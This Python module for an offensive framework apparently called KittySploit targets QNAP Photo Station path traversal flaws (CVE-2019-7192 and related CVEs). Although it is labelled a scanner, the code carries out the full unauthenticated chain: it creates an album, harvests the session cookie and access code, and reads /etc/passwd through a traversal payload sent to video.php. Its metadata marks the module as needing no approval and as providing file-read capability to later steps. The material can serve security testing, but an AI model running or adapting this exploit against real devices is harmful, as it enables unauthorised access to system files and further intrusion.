#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""QNAP Photo Station album API path traversal (CVE-2019-7192..7195)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'QNAP Photo Station - Path Traversal Detection (CVE-2019-7192)',
        'description': (
            'Detects QNAP Photo Station NAS-201911-25 (CVE-2019-7192/7193/7194/7195) by '
            'creating a slideshow album, extracting access code, then reading /etc/passwd '
            'via /p/api/video.php filename traversal.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2019', 'qnap', 'photostation', 'lfi',
            'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.qnap.com/en/security-advisory/nas-201911-25',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-7192',
        ],
        'cve': 'CVE-2019-7192',
    }

    base_path = OptString('', 'Optional Photo Station base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        r = self.http_request(
            method='POST',
            path=f'{prefix}/p/api/album.php',
            data='a=setSlideshow&f=qsamplealbum',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200 or '<output>' not in (r.text or ''):
            return False
        m = re.search(r'<output>([^<]+)', r.text or '')
        if not m:
            return False
        album_id = m.group(1)
        cookie = None
        for k, v in (r.headers or {}).items():
            if k.lower() == 'set-cookie' and 'QMS_SID=' in v:
                cm = re.search(r'(QMS_SID=[^;]+)', v)
                if cm:
                    cookie = cm.group(1)
                    break
        if not cookie or '=' not in cookie:
            return False
        cname, cval = cookie.split('=', 1)
        r2 = self.http_request(
            method='GET',
            path=f'{prefix}/slideshow.php?album={album_id}',
            cookies={cname: cval},
            allow_redirects=False,
        )
        if not r2 or 'encodeURIComponent' not in (r2.text or ''):
            return False
        am = re.search(r"encodeURIComponent\('([^']+)", r2.text or '')
        if not am:
            return False
        access_code = am.group(1)
        data = (
            f'album={album_id}&a=caption&ac={access_code}&filename='
            + ('../' * 9) + 'etc/passwd'
        )
        r3 = self.http_request(
            method='POST',
            path=f'{prefix}/p/api/video.php',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            cookies={cname: cval},
            allow_redirects=False,
        )
        if r3 and re.search(r'admin:.*:0:[01]:', r3.text or ''):
            self.set_info(
                severity='critical',
                reason='QNAP Photo Station path traversal (CVE-2019-7192)',
                path=f'{prefix}/p/api/video.php',
            )
            return True
        return False
